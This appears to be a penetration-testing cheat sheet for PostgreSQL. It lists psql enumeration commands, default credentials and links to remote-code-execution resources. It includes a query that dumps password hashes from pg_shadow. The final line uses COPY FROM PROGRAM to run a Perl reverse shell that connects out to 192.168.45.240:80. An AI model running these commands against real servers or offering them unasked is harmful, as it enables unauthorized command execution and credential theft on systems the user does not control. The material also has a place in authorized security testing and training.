### Tips

- https://github.com/squid22/PostgreSQL_RCE
- https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767

## Tools

### psql

```bash
# default credentials: postgres:postgres
psql -h $IP -p <port> -U postgres
psql -h localhost -d <database_name> -U <User>

\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s

# Open a listener to catch the below command
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.240:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```